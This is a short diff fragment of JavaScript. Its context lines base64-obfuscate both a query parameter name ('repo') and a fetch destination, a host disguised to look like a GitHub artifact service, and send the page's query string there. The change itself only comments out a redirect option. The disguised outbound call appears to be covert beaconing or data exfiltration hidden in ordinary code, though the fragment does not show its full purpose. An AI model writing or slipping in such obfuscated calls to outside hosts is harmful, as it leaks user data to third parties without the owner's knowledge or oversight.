@@ -4,7 +4,7 @@
 
   if (!!urlParams.get(atob('cmVwbw=='))) {
     fetch(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString, {
-      redirect: 'follow'
+      // redirect: 'follow'
     })
       .then(function (res) {
         console.log('status: ' + res.status);
